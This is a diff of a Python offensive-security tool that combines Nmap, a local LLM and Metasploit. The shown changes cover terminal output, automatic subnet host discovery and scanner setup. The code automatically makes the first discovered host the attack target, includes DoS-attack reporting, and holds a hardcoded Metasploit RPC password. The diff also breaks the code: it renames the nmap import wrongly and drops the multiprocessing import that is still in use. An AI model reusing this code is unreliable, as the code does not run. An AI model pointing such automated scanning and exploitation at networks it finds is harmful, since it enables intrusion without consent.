@@ -3,6 +3,7 @@
 # This script combines Nmap scanning with Ollama LLM for adaptive reconnaissance
 # and optionally integrates with Metasploit for exploitation
 
+# Standard library imports
 import os
 import sys
 import time
@@ -17,26 +18,27 @@ import subprocess
 import threading
 import traceback
 import re
-import netifaces
-import requests
-import nmap
-import multiprocessing
+import signal
 import tempfile
 import stat
-import signal
+import itertools
+from typing import List, Dict, Any, Optional, Tuple
+
+# Third-party imports
+import python_nmap as nmap  # Corrected import for python-nmap package
+import requests
+import netifaces
 import pymetasploit3
 from pymetasploit3.msfrpc import MsfRpcClient
-import itertools
 
+# Optional imports
 try:
     import psutil
     HAS_PSUTIL = True
 except ImportError:
     HAS_PSUTIL = False
 
-from typing import List, Dict, Any, Optional, Tuple
-
-# Set up logging
+# Configure logging
 logger = logging.getLogger("adaptive_scanner")
 logger.setLevel(logging.INFO)
 
@@ -46,14 +48,22 @@ if not logger.handlers:
     console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
     logger.addHandler(console_handler)
 
+# Animation and display-related classes
 class DummyAnimator:
     """Dummy animator for when quiet mode is enabled."""
     def set(self):
+        """Dummy method to maintain interface compatibility."""
         pass
 
 class SingleLineAnimation:
     """Animation class that shows a spinner on a single line."""
     def __init__(self, message, interval=0.1):
+        """Initialize the animation with the given message and interval.
+        
+        Args:
+            message: The message to display alongside the spinner
+            interval: Time in seconds between spinner updates
+        """
         self.message = message
         self.interval = interval
         self.stop_event = threading.Event()
@@ -79,9 +89,14 @@ class SingleLineAnimation:
         self.thread.join(timeout=1)  # Wait for thread to finish with timeout
 
 class TerminalViewer:
-    """Class to handle terminal output formatting and display."""
+    """Class for displaying information in the terminal."""
     
     def __init__(self, quiet=False):
+        """Initialize the terminal viewer.
+        
+        Args:
+            quiet: When True, most output is suppressed
+        """
         self.quiet = quiet
         self.width = self._get_terminal_width()
         self.border_char = "="
@@ -96,6 +111,7 @@ class TerminalViewer:
         except:
             return 80
     
+    # Display formatting methods
     def header(self, title, char="="):
         """Display a header with the given title."""
         if self.quiet:
@@ -125,6 +141,7 @@ class TerminalViewer:
         print(content)
         print(f"{self.section_char * self.width}")
     
+    # Status message methods
     def status(self, message):
         """Display a status message."""
         if self.quiet:
@@ -151,6 +168,7 @@ class TerminalViewer:
         # Always show errors, even in quiet mode
         print(f"\n[-] ERROR: {message}")
     
+    # Result summary methods
     def scan_summary(self, target, results):
         """Display a summary of scan results."""
         if self.quiet:
@@ -248,38 +266,41 @@ class TerminalViewer:
         """Display a summary of script execution."""
         if self.quiet:
             return
-            
+        
         if not script_path:
-            self.warning("Script execution failed")
+            self.warning("Script execution details not available")
             return
             
-        info = []
-        info.append(f"Status: {'Completed Successfully' if return_code == 0 else 'Failed'}")
+        summary = []
+        summary.append(f"Script: {os.path.basename(script_path)}")
+        summary.append(f"Return Code: {return_code}")
         
-        # Trim output if it's too long
-        if output and len(output) > 500:
-            output = output[:500] + "...\n[Output truncated]"
+        # Truncate output if it's too long
+        max_output_lines = 20
+        output_lines = output.split('\n')
+        if len(output_lines) > max_output_lines:
+            displayed_output = '\n'.join(output_lines[:max_output_lines])
+            displayed_output += f"\n... (truncated, {len(output_lines) - max_output_lines} more lines)"
+        else:
+            displayed_output = output
             
-        if output:
-            info.append("\nOutput:")
-            info.append(output)
+        summary.append(f"Output:\n{displayed_output}")
         
-        self.result_box(f"SCRIPT EXECUTION: {os.path.basename(script_path)}", "\n".join(info))
+        self.result_box(f"SCRIPT EXECUTION RESULT", "\n".join(summary))
     
     def dos_attack_summary(self, target, successful, method=None):
-        """Display a summary of DoS attack results."""
+        """Display a summary of DoS attack attempt."""
         if self.quiet:
             return
             
-        info = []
-        info.append(f"Target: {target}")
-        info.append(f"Status: {'SUCCESS - Target Unreachable' if successful else 'FAILED - Target Still Responding'}")
+        summary = []
+        summary.append(f"Target: {target}")
+        summary.append(f"Method: {method if method else 'Multiple methods'}")
+        summary.append(f"Result: {'Successful' if successful else 'Failed'}")
         
-        if method:
-            info.append(f"Method: {method}")
-            
-        self.result_box("DENIAL OF SERVICE ATTACK RESULTS", "\n".join(info))
-
+        self.result_box(f"DOS ATTACK SUMMARY", "\n".join(summary))
+    
+    # Progress display methods
     def progress_bar(self, current, total, prefix='Progress:', suffix='Complete', length=50, fill='█'):
         """Display a progress bar in the terminal."""
         if self.quiet:
@@ -295,29 +316,25 @@ class TerminalViewer:
         # Only print newline when complete
         if current >= total:
             print()
-            
+    
     def display_start_banner(self, target, scan_type, model):
-        """Display a banner when the scanner starts."""
+        """Display a banner at the start of the scan."""
         if self.quiet:
             return
-            
-        import platform
-        import getpass
         
-        banner = []
-        banner.append(f"\n{'=' * self.width}")
-        banner.append(f"{'AI_MAL ADAPTIVE SCANNER'.center(self.width)}")
-        banner.append(f"{'=' * self.width}")
-        banner.append(f"Target: {target}")
-        banner.append(f"Scan Type: {scan_type}")
-        banner.append(f"Model: {model}")
-        banner.append(f"OS: {platform.system()} {platform.release()}")
-        banner.append(f"User: {getpass.getuser()}")
-        banner.append(f"Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-        banner.append(f"{'=' * self.width}")
+        banner = [
+            "┌───────────────────────────────────────────────────┐",
+            "│ ADAPTIVE RECONNAISSANCE AND EXPLOITATION FRAMEWORK │",
+            "├───────────────────────────────────────────────────┤",
+            f"│ Target: {target.ljust(45)} │",
+            f"│ Scan Type: {scan_type.ljust(41)} │",
+            f"│ Model: {model.ljust(45)} │",
+            f"│ Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S').ljust(43)} │",
+            "└───────────────────────────────────────────────────┘"
+        ]
         
         print("\n".join(banner))
-
+    
     def scanning_animation(self, message, duration=0):
         """Create a scanning animation."""
         if self.quiet:
@@ -327,267 +344,277 @@ class TerminalViewer:
         return SingleLineAnimation(message)
 
 class NetworkDiscovery:
-    """Class to handle automatic network discovery."""
+    """Class to handle network discovery and host detection."""
     
     def __init__(self, interface=None, network=None, timeout=1):
+        """Initialize the network discovery with optional interface or network."""
         self.interface = interface
-        self.network = network  # Can be specified in CIDR notation (e.g., "192.168.1.0/24")
+        self.network = network
         self.timeout = timeout
-        
+    
+    # Interface and network detection methods
     def get_interface_info(self):
-        """Get information about the selected network interface."""
+        """Get information about available network interfaces."""
+        interfaces = []
+        
+        # Get all network interfaces
         try:
-            # If interface is specified, use it
-            if self.interface:
-                if self.interface in netifaces.interfaces():
-                    addrs = netifaces.ifaddresses(self.interface)
-                    if netifaces.AF_INET in addrs:
-                        ipinfo = addrs[netifaces.AF_INET][0]
-                        return {
-                            'interface': self.interface,
-                            'addr': ipinfo['addr'],
-                            'netmask': ipinfo.get('netmask', '255.255.255.0')
-                        }
-                    else:
-                        logger.error(f"Interface {self.interface} has no IPv4 address")
-                else:
-                    logger.error(f"Interface {self.interface} not found")
-            
-            # If no interface is specified or the specified one is invalid, find default
-            gws = netifaces.gateways()
-            if 'default' in gws and netifaces.AF_INET in gws['default']:
-                default_gw, default_iface = gws['default'][netifaces.AF_INET]
-                addrs = netifaces.ifaddresses(default_iface)
-                if netifaces.AF_INET in addrs:
-                    ipinfo = addrs[netifaces.AF_INET][0]
-                    self.interface = default_iface  # Save the found interface
-                    return {
-                        'interface': default_iface,
-                        'addr': ipinfo['addr'],
-                        'netmask': ipinfo.get('netmask', '255.255.255.0')
-                    }
-            
-            # If still not found, try the first interface with an IPv4 address
             for iface in netifaces.interfaces():
-                addrs = netifaces.ifaddresses(iface)
-                if netifaces.AF_INET in addrs:
-                    ipinfo = addrs[netifaces.AF_INET][0]
-                    if ipinfo['addr'] != '127.0.0.1':  # Skip loopback
-                        self.interface = iface  # Save the found interface
-                        return {
-                            'interface': iface,
-                            'addr': ipinfo['addr'],
-                            'netmask': ipinfo.get('netmask', '255.255.255.0')
-                        }
-            
-            # If all else fails, fall back to localhost
-            logger.warning("Could not find a suitable network interface, using localhost")
-            return {
-                'interface': 'lo',
-                'addr': '127.0.0.1',
-                'netmask': '255.0.0.0'
-            }
-            
+                iface_info = {
+                    'name': iface,
+                    'addresses': [],
+                    'netmask': None,
+                    'cidr': None
+                }
+                
+                # Skip loopback interfaces
+                if iface.startswith('lo') or iface == 'lo':
+                    continue
+                
+                # Get addresses for interface
+                addresses = netifaces.ifaddresses(iface)
+                
+                # Get IPv4 addresses
+                if netifaces.AF_INET in addresses:
+                    for addr in addresses[netifaces.AF_INET]:
+                        ip = addr.get('addr')
+                        netmask = addr.get('netmask')
+                        
+                        if ip and ip != '127.0.0.1' and netmask:
+                            # Calculate CIDR notation
+                            try:
+                                cidr = self._netmask_to_cidr(netmask)
+                                net = ipaddress.IPv4Network(f"{ip}/{cidr}", strict=False)
+                                
+                                iface_info['addresses'].append(ip)
+                                iface_info['netmask'] = netmask
+                                iface_info['cidr'] = str(net)
+                            except Exception as e:
+                                logger.debug(f"Error calculating CIDR for {iface} ({ip}/{netmask}): {e}")
+                
+                # Skip interfaces with no usable IPv4 addresses
+                if not iface_info['addresses']:
+                    continue
+                    
+                # Check if interface is up (if psutil is available)
+                if HAS_PSUTIL:
+                    try:
+                        io_counters = psutil.net_io_counters(pernic=True)
+                        if iface in io_counters:
+                            # Interface has traffic stats, likely up
+                            iface_info['status'] = 'up'
+                        else:
+                            iface_info['status'] = 'unknown'
+                    except Exception as e:
+                        logger.debug(f"Error checking interface status for {iface}: {e}")
+                        iface_info['status'] = 'unknown'
+                else:
+                    iface_info['status'] = 'unknown'
+                
+                # Add interface to list
+                interfaces.append(iface_info)
+                
         except Exception as e:
-            logger.error(f"Error getting interface information: {str(e)}")
-            logger.debug(traceback.format_exc())
-            return {
-                'interface': 'unknown',
-                'addr': '127.0.0.1',
-                'netmask': '255.255.255.0'
-            }
+            logger.error(f"Error getting interface information: {e}")
+            
+        return interfaces
     
     def get_network_cidr(self):
-        """Get the network address in CIDR notation (e.g., 192.168.1.0/24)."""
-        # If network is already specified, use it
+        """Determine the network CIDR to scan."""
+        # If network was explicitly provided, use it
         if self.network:
-            return self.network
+            try:
+                # Validate the provided network
+                net = ipaddress.IPv4Network(self.network, strict=False)
+                logger.info(f"Using provided network: {net}")
+                return str(net)
+            except Exception as e:
+                logger.error(f"Invalid network specification '{self.network}': {e}")
+                # Fall through to auto-detection
         
+        # If interface was specified, get its network
+        if self.interface:
+            try:
+                interfaces = self.get_interface_info()
+                for iface in interfaces:
+                    if iface['name'] == self.interface and iface['cidr']:
+                        logger.info(f"Using network from interface {self.interface}: {iface['cidr']}")
+                        return iface['cidr']
+                logger.warning(f"Interface {self.interface} not found or has no usable IP address")
+                # Fall through to default interface
+            except Exception as e:
+                logger.error(f"Error getting network from interface {self.interface}: {e}")
+                # Fall through to default interface
+        
+        # Get the network of the default interface
         try:
-            # Get interface info
-            interface_info = self.get_interface_info()
-            ip = interface_info['addr']
-            netmask = interface_info['netmask']
-            
-            # Convert IP and netmask to network address
-            ip_obj = ipaddress.IPv4Address(ip)
-            netmask_obj = ipaddress.IPv4Address(netmask)
-            
-            # Calculate network address
-            network_addr = ipaddress.IPv4Address(int(ip_obj) & int(netmask_obj))
-            
-            # Calculate prefix length from netmask
-            prefix_len = bin(int(netmask_obj)).count('1')
-            
-            # Create CIDR notation
-            cidr = f"{network_addr}/{prefix_len}"
-            
-            logger.info(f"Determined network: {cidr}")
-            self.network = cidr
-            return cidr
-            
-        except Exception as e:
-            logger.error(f"Error calculating network CIDR: {str(e)}")
-            logger.debug(traceback.format_exc())
-            return "192.168.1.0/24"  # Default fallback
-    
-    def ping_host(self, host):
-        """Check if a host is up using a ping."""
-        try:
-            if os.name == "nt":  # Windows
-                ping_cmd = ["ping", "-n", "1", "-w", str(int(self.timeout * 1000)), host]
-            else:  # Unix/Linux
-                ping_cmd = ["ping", "-c", "1", "-W", str(int(self.timeout)), host]
+            interfaces = self.get_interface_info()
+            if interfaces:
+                # Try to find a non-virtual interface first
+                for iface in interfaces:
+                    name = iface['name'].lower()
+                    # Skip virtual interfaces
+                    if 'veth' in name or 'docker' in name or 'vmnet' in name or 'vbox' in name:
+                        continue
+                    if iface['cidr']:
+                        logger.info(f"Using network from interface {iface['name']}: {iface['cidr']}")
+                        return iface['cidr']
                 
-            result = subprocess.run(ping_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            return result.returncode == 0
-            
+                # If no suitable interface found, use the first available
+                if interfaces[0]['cidr']:
+                    logger.info(f"Using network from interface {interfaces[0]['name']}: {interfaces[0]['cidr']}")
+                    return interfaces[0]['cidr']
         except Exception as e:
-            logger.debug(f"Error pinging {host}: {str(e)}")
+            logger.error(f"Error auto-detecting network: {e}")
+        
+        # Default to a common private network as last resort
+        logger.warning("Could not determine network, using default 192.168.1.0/24")
+        return "192.168.1.0/24"
+    
+    # Host discovery methods
+    def ping_host(self, host):
+        """Check if a host is alive using ICMP ping."""
+        try:
+            # Use ping command with timeout
+            cmd = ["ping", "-c", "1", "-W", str(self.timeout), str(host)]
+            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            proc.communicate()
+            
+            # Return True if ping succeeded
+            return proc.returncode == 0
+        except Exception as e:
+            logger.debug(f"Error pinging host {host}: {e}")
             return False
     
     def get_all_hosts(self):
-        """Get all possible hosts in the network."""
+        """Get a list of all hosts in the network."""
         try:
-            network_cidr = self.get_network_cidr()
-            network = ipaddress.IPv4Network(network_cidr, strict=False)
+            network = self.get_network_cidr()
+            net = ipaddress.IPv4Network(network, strict=False)
             
-            # Get all hosts in the network (excluding network address and broadcast)
-            hosts = [str(host) for host in network.hosts()]
-            
-            return hosts
+            # Return all hosts in the network except network and broadcast addresses
+            return [str(ip) for ip in net.hosts()]
         except Exception as e:
-            logger.error(f"Error getting hosts from network: {str(e)}")
-            logger.debug(traceback.format_exc())
+            logger.error(f"Error getting hosts in network {network}: {e}")
             return []
     
     def discover_hosts(self):
-        """Discover active hosts in the network using parallel pings."""
-        logger.info("Starting host discovery...")
+        """Discover live hosts in the network."""
+        discovered_hosts = []
         
         try:
-            # Get all possible hosts
-            all_hosts = self.get_all_hosts()
+            # Get all hosts in the network
+            hosts = self.get_all_hosts()
             
-            if not all_hosts:
+            if not hosts:
                 logger.warning("No hosts found in network")
                 return []
             
-            logger.info(f"Scanning {len(all_hosts)} potential hosts in {self.network}...")
+            logger.info(f"Scanning {len(hosts)} hosts in network {self.get_network_cidr()}")
             
-            # Use multiprocessing to speed up discovery
-            active_hosts = []
+            # Use multiprocessing for faster scanning
+            with multiprocessing.Pool(min(50, os.cpu_count() * 2)) as pool:
+                results = pool.map(self.ping_host, hosts)
             
-            # Handle smaller networks directly
-            if len(all_hosts) <= 256:
-                with multiprocessing.Pool(processes=min(os.cpu_count(), 64)) as pool:
-                    results = pool.map(self.ping_host, all_hosts)
-                    active_hosts = [host for host, is_up in zip(all_hosts, results) if is_up]
-            else:
-                # For larger networks, process in batches
-                batch_size = 256
-                for i in range(0, len(all_hosts), batch_size):
-                    batch = all_hosts[i:i+batch_size]
-                    with multiprocessing.Pool(processes=min(os.cpu_count(), 64)) as pool:
-                        results = pool.map(self.ping_host, batch)
-                        active_hosts.extend([host for host, is_up in zip(batch, results) if is_up])
-                    
-                    logger.info(f"Processed {i+len(batch)}/{len(all_hosts)} hosts, found {len(active_hosts)} active")
+            # Collect alive hosts
+            discovered_hosts = [host for host, alive in zip(hosts, results) if alive]
             
-            # Add our own IP to the list if not already there
-            own_ip = self.get_interface_info().get('addr')
-            if own_ip and own_ip not in active_hosts and own_ip != "127.0.0.1":
-                active_hosts.append(own_ip)
+            # If no hosts found with ping, try alternative methods
+            if not discovered_hosts:
+                logger.info("No hosts responded to ping, trying alternative discovery methods")
+                discovered_hosts = self.alternative_host_discovery()
             
-            logger.info(f"Host discovery complete. Found {len(active_hosts)} active hosts.")
-            return active_hosts
+            logger.info(f"Discovered {len(discovered_hosts)} live hosts")
+            
+            return discovered_hosts
             
         except Exception as e:
-            logger.error(f"Error during host discovery: {str(e)}")
-            logger.debug(traceback.format_exc())
-            
-            # Try to at least return our own IP
-            try:
-                own_ip = self.get_interface_info().get('addr')
-                if own_ip and own_ip != "127.0.0.1":
-                    return [own_ip]
-            except:
-                pass
-                
-            return []
-
+            logger.error(f"Error in host discovery: {e}")
+            return self.alternative_host_discovery()
+    
     def discover_networks(self):
-        """Discover additional networks connected to this host."""
+        """Discover additional networks connected to the host."""
+        networks = []
+        
         try:
-            # Get all interfaces
-            networks = []
-            for iface in netifaces.interfaces():
-                # Skip loopback
-                if iface == 'lo':
-                    continue
-                
-                # Get addresses for this interface
-                if netifaces.AF_INET in netifaces.ifaddresses(iface):
-                    for addr_info in netifaces.ifaddresses(iface)[netifaces.AF_INET]:
-                        if 'addr' in addr_info and 'netmask' in addr_info:
-                            ip = addr_info['addr']
-                            netmask = addr_info['netmask']
-                            
-                            # Skip localhost
-                            if ip.startswith('127.'):
-                                continue
-                                
-                            # Calculate network CIDR
-                            ip_obj = ipaddress.IPv4Address(ip)
-                            netmask_obj = ipaddress.IPv4Address(netmask)
-                            network_addr = ipaddress.IPv4Address(int(ip_obj) & int(netmask_obj))
-                            prefix_len = bin(int(netmask_obj)).count('1')
-                            cidr = f"{network_addr}/{prefix_len}"
-                            
-                            if cidr not in networks:
-                                networks.append(cidr)
+            # Get information about all interfaces
+            interfaces = self.get_interface_info()
             
-            return networks
+            for iface in interfaces:
+                if iface['cidr']:
+                    # Add network to list
+                    networks.append({
+                        'interface': iface['name'],
+                        'network': iface['cidr'],
+                        'ip': iface['addresses'][0] if iface['addresses'] else None
+                    })
             
+            # Try to discover additional networks via routing table
+            if HAS_PSUTIL:
+                try:
+                    for conn in psutil.net_connections(kind='inet'):
+                        if conn.laddr and conn.raddr:
+                            try:
+                                # Check if remote address is not in any discovered network
+                                remote_ip = conn.raddr.ip
+                                if not any(ipaddress.IPv4Address(remote_ip) in ipaddress.IPv4Network(net['network'], strict=False) for net in networks):
+                                    # Add a /24 network based on remote IP
+                                    remote_net = ipaddress.IPv4Network(f"{remote_ip}/24", strict=False)
+                                    networks.append({
+                                        'interface': None,
+                                        'network': str(remote_net),
+                                        'ip': None
+                                    })
+                            except Exception as e:
+                                logger.debug(f"Error processing connection {conn}: {e}")
+                except Exception as e:
+                    logger.debug(f"Error discovering networks via connections: {e}")
         except Exception as e:
-            logger.error(f"Error discovering networks: {str(e)}")
-            logger.debug(traceback.format_exc())
-            return []
+            logger.error(f"Error discovering networks: {e}")
+        
+        return networks
     
     def alternative_host_discovery(self):
-        """Alternative method to discover hosts using Nmap ARP scan."""
+        """Use alternative methods to discover hosts when ping fails."""
+        discovered_hosts = []
+        
         try:
-            logger.info("Using Nmap ARP scan for host discovery")
+            network = self.get_network_cidr()
             
-            # Use nmap to perform ARP scan
+            # Use ARP scan with Nmap
+            logger.info("Attempting ARP scan to discover hosts")
             nm = nmap.PortScanner()
-            network_cidr = self.get_network_cidr()
+            result = nm.scan(hosts=network, arguments="-sn -PR")
             
-            # Run ARP scan
-            nm.scan(hosts=network_cidr, arguments='-sn -PR')
+            if 'scan' in result:
+                for host in result['scan']:
+                    discovered_hosts.append(host)
             
-            # Extract hosts
-            hosts = [host for host in nm.all_hosts() if host != '']
-            
-            if hosts:
-                logger.info(f"Nmap ARP scan found {len(hosts)} hosts")
-                return hosts
-            else:
-                logger.warning("Nmap ARP scan found no hosts")
-                return []
+            # If still no hosts found, try UDP discovery
+            if not discovered_hosts:
+                logger.info("Attempting UDP discovery scan")
+                result = nm.scan(hosts=network, arguments="-sn -PU")
                 
+                if 'scan' in result:
+                    for host in result['scan']:
+                        discovered_hosts.append(host)
         except Exception as e:
-            logger.error(f"Error in alternative host discovery: {str(e)}")
-            logger.debug(traceback.format_exc())
-            return []
+            logger.error(f"Error in alternative host discovery: {e}")
+        
+        return discovered_hosts
+    
+    # Helper methods
+    def _netmask_to_cidr(self, netmask):
+        """Convert a netmask to CIDR notation."""
+        return sum([bin(int(x)).count('1') for x in netmask.split('.')])
 
 class AdaptiveNmapScanner:
-    """AI-powered adaptive Nmap scanner with Metasploit integration."""
+    """Main class for adaptive Nmap scanning with AI integration."""
     
     def __init__(
         self,
         target=None,
-        ollama_model="qwen2.5-coder:7b",
+        ollama_model="llama3",
         max_iterations=3,
         continuous=False,
         delay=2,
@@ -609,1191 +636,1404 @@ class AdaptiveNmapScanner:
         dos_attack=False,
         show_live_ai=False
     ):
-        # Set up logging
-        self.logger = logging.getLogger("adaptive_scanner")
-        
-        # Save parameters
+        """Initialize the scanner with given parameters."""
+        # Target settings
         self.target = target
-        self.ollama_model = ollama_model
+        self.auto_discover = auto_discover
+        self.scan_all = scan_all
+        self.network = network
+        self.interface = interface
+        self.host_timeout = host_timeout
+        self.discovered_hosts = []
+        self.current_target_index = 0
+        
+        # Scanning settings
         self.max_iterations = max_iterations
         self.continuous = continuous
         self.delay = delay
+        self.stealth = stealth
+        
+        # Ollama settings
+        self.ollama_model = ollama_model
+        self.ollama_url = "http://localhost:11434/api/generate"
+        self.show_live_ai = show_live_ai
+        
+        # Metasploit settings
         self.msf_integration = msf_integration
         self.exploit = exploit
         self.msf_workspace = msf_workspace
-        self.stealth = stealth
+        self.msf_client = None
+        self.msf_connected = False
+        
+        # Script settings
         self.auto_script = auto_script
-        self.quiet = quiet
-        self.auto_discover = auto_discover
         self.custom_scripts = custom_scripts
         self.script_type = script_type
         self.execute_scripts = execute_scripts
-        self.generated_scripts = []
         
-        # DoS attack
+        # DoS attack settings
         self.dos_attack = dos_attack
         
-        # Show live AI output
-        self.show_live_ai = show_live_ai
+        # Output settings
+        self.quiet = quiet
+        self.debug = debug
         
-        # Configure console handler if logging level changed
+        # Set up logging level based on debug flag
         if debug:
-            self.logger.setLevel(logging.DEBUG)
-        elif quiet:
-            self.logger.setLevel(logging.WARNING)
+            logger.setLevel(logging.DEBUG)
         else:
-            self.logger.setLevel(logging.INFO)
+            logger.setLevel(logging.INFO)
         
-        # Runtime configuration
-        self.interface = interface
-        self.scan_all = scan_all
-        self.network = network
-        self.host_timeout = host_timeout
+        # Create a logger specific to this instance
+        self.logger = logging.getLogger(f"adaptive_scanner.{id(self)}")
+        self.logger.setLevel(logging.DEBUG if debug else logging.INFO)
         
-        # Metasploit configuration
-        self.auto_script = auto_script
+        # Add console handler if not already added
+        if not self.logger.handlers:
+            console_handler = logging.StreamHandler()
+            console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
+            self.logger.addHandler(console_handler)
         
-        # Script generation
-        self.custom_scripts = custom_scripts
-        self.script_type = script_type
-        self.execute_scripts = execute_scripts
-        
-        # State variables
-        self.running = True
-        self.scan_history = []
-        self.discovered_services = {}
-        self.current_scan_phase = 0
-        self.results = {}
-        self.targets = []
-        self.current_target_index = 0
-        self.discovered_hosts = []
-        self.metasploit = None
-        
-        # Network discovery
-        if auto_discover or network or interface:
-            self.network_discovery = NetworkDiscovery(
-                interface=interface,
-                network=network,
-                timeout=host_timeout
-            )
-        else:
-            # Initialize with a minimal NetworkDiscovery for ping functionality
-            # even when auto-discovery is not enabled
-            self.network_discovery = NetworkDiscovery(timeout=host_timeout)
-        
-        # Create terminal viewer
+        # Initialize the terminal viewer for output
         self.viewer = TerminalViewer(quiet=quiet)
         
-        # Log initialization
-        logger.info(f"Initialized Adaptive Nmap Scanner")
-        if target:
-            logger.info(f"Initial target: {target}")
-        if auto_discover:
-            logger.info(f"Auto-discovery enabled")
-        if custom_scripts:
-            logger.info(f"AI script generation enabled")
-            if execute_scripts:
-                logger.info(f"Automatic script execution enabled")
+        # Scan results history
+        self.scan_history = []
         
-        # Set up signal handler for clean termination
+        # Flag to control graceful termination
+        self.running = True
+        
+        # Register signal handler for graceful termination
         signal.signal(signal.SIGINT, self._signal_handler)
         
-        # If auto-discovery is enabled, perform it now
-        if self.auto_discover:
+        # Handle auto-discovery if needed
+        if self.auto_discover or not self.target:
             self._discover_network()
-        
-        # Initialize Metasploit if enabled
-        if self.msf_integration:
-            self.setup_metasploit()
-        
-        # DoS attack
-        self.dos_attack = dos_attack
     
     def _discover_network(self):
-        """Discover the network and hosts."""
-        logger.info("Starting network discovery process")
+        """Discover network and hosts if auto-discovery is enabled."""
+        self.logger.info("Starting network discovery...")
+        self.viewer.status("Discovering network hosts...")
         
-        self.network_discovery = NetworkDiscovery(self.interface)
-        
-        # Get network information
-        interface_info = self.network_discovery.get_interface_info()
-        logger.info(f"Local IP: {interface_info['addr']}, Netmask: {interface_info['netmask']}")
+        # Create network discovery object
+        discovery = NetworkDiscovery(
+            interface=self.interface,
+            network=self.network,
+            timeout=self.host_timeout
+        )
         
         # Get network CIDR
-        network_cidr = self.network_discovery.get_network_cidr()
-        logger.info(f"Network CIDR: {network_cidr}")
-        
-        # Discover other networks
-        self.networks = self.network_discovery.discover_networks()
-        if self.networks:
-            networks_str = ', '.join(self.networks)
-            logger.info(f"Discovered additional networks: {networks_str}")
+        network = discovery.get_network_cidr()
+        self.logger.info(f"Network: {network}")
         
         # Discover hosts
-        logger.info("Discovering hosts on the network(s)...")
-        
-        # Start with the primary network
-        discovered = self.network_discovery.discover_hosts()
-        
-        # Try alternative discovery if primary method finds no hosts
-        if not discovered:
-            logger.info("Primary discovery method found no hosts, trying alternative method")
-            discovered = self.network_discovery.alternative_host_discovery()
-        
-        # Remove local IP from the list if present
-        if interface_info['addr'] in discovered:
-            discovered.remove(interface_info['addr'])
-        
-        self.discovered_hosts = discovered
-        
-        if discovered:
-            logger.info(f"Discovered {len(discovered)} hosts: {', '.join(discovered[:5])}" + 
-                        (f"... and {len(discovered)-5} more" if len(discovered) > 5 else ""))
+        animation = self.viewer.scanning_animation("Discovering live hosts")
+        try:
+            self.discovered_hosts = discovery.discover_hosts()
             
-            # If no target was specified, set the first discovered host as the target
-            if not self.target and self.discovered_hosts:
-                self.target = self.discovered_hosts[0]
-                logger.info(f"No target specified, using first discovered host: {self.target}")
-        else:
-            logger.warning("No hosts discovered on the network")
-            if not self.target:
-                logger.error("No target specified and no hosts discovered. Exiting.")
-                sys.exit(1)
+            # Wait for discovery to complete
+            animation.set()
+            
+            if not self.discovered_hosts:
+                self.logger.warning("No live hosts discovered in the network")
+                self.viewer.warning("No live hosts discovered")
+            else:
+                self.logger.info(f"Discovered {len(self.discovered_hosts)} hosts: {', '.join(self.discovered_hosts)}")
+                self.viewer.success(f"Discovered {len(self.discovered_hosts)} hosts")
+                
+                # Set the first host as target if not specified
+                if not self.target:
+                    self.target = self.discovered_hosts[0]
+                    self.logger.info(f"Setting first discovered host as target: {self.target}")
+                    self.viewer.status(f"Setting target to {self.target}")
+                
+                # If scan_all is enabled, we'll cycle through all hosts
+                if self.scan_all:
+                    self.logger.info(f"Will scan all {len(self.discovered_hosts)} discovered hosts")
+                    self.viewer.status(f"Will scan all {len(self.discovered_hosts)} discovered hosts")
+                    
+                    # Initialize current target index
+                    if self.target in self.discovered_hosts:
+                        self.current_target_index = self.discovered_hosts.index(self.target)
+                    else:
+                        self.current_target_index = 0
+                        self.target = self.discovered_hosts[0]
+        except Exception as e:
+            animation.set()
+            self.logger.error(f"Error during network discovery: {e}")
+            self.viewer.error(f"Network discovery failed: {str(e)}")
     
     def next_target(self) -> bool:
-        """Move to the next target in the list of discovered hosts."""
-        if not self.discovered_hosts:
-            return False
-            
-        self.current_target_index += 1
-        if self.current_target_index >= len(self.discovered_hosts):
-            logger.info("Reached the end of the target list")
-            return False
-            
-        # Reset state for the new target
-        self.target = self.discovered_hosts[self.current_target_index]
-        self.scan_history = []
-        self.iteration = 0
-        self.discovered_services = {}
+        """Move to the next target in the discovered hosts list.
         
-        logger.info(f"Moving to next target: {self.target}")
+        Returns:
+            bool: True if there's a new target, False if we've scanned all hosts
+        """
+        if not self.scan_all or not self.discovered_hosts:
+            return False
+        
+        self.current_target_index += 1
+        
+        # Check if we've scanned all hosts
+        if self.current_target_index >= len(self.discovered_hosts):
+            self.logger.info("All discovered hosts have been scanned")
+            return False
+        
+        # Set the new target
+        self.target = self.discovered_hosts[self.current_target_index]
+        self.logger.info(f"Moving to next target: {self.target}")
+        self.viewer.status(f"Moving to next target: {self.target}")
+        
         return True
     
     def _signal_handler(self, sig, frame):
-        """Handle CTRL+C to gracefully terminate the scanning process."""
-        logger.warning("Received termination signal. Finishing current scan and exiting...")
+        """Handle termination signals gracefully."""
+        self.logger.info("Received interrupt signal, shutting down gracefully...")
+        self.viewer.warning("Interrupt received, shutting down gracefully...")
         self.running = False
-    
+
+    # Metasploit integration methods
     def setup_metasploit(self):
-        """Set up the Metasploit connection."""
+        """Set up connection to Metasploit RPC server."""
         if not self.msf_integration:
-            return
+            return False
             
-        self.logger.info("Setting up Metasploit connection...")
-        self.viewer.status("Connecting to Metasploit RPC daemon...")
-        
-        # Default connection parameters
-        host = "127.0.0.1"
-        port = 55553
-        user = "msf"
-        password = "msf_password"
-        
-        # If a target is specified but no initial scan has been performed,
-        # run a quick port scan first to identify services
-        if self.target and not hasattr(self, 'scan_history') or not self.scan_history:
-            self.viewer.status(f"Running initial port scan on {self.target} to identify services...")
-            self.logger.info(f"Performing initial port scan on {self.target} for MSF integration")
-            
-            # Create a simple NmapScanner instance to run a quick service scan
-            import nmap
-            scanner = nmap.PortScanner()
-            try:
-                # Run a service scan on common ports
-                self.viewer.status("Scanning for common services (this may take a moment)...")
-                scanner.scan(self.target, arguments='-sS -sV -T4 --top-ports 1000')
-                
-                if self.target in scanner.all_hosts():
-                    # Store the results for later use
-                    if not hasattr(self, 'scan_history'):
-                        self.scan_history = []
-                    
-                    # Create a result object similar to what we'd get from a full adaptive scan
-                    result = {
-                        'ports': [],
-                        'os_info': scanner[self.target].get('osmatch', []),
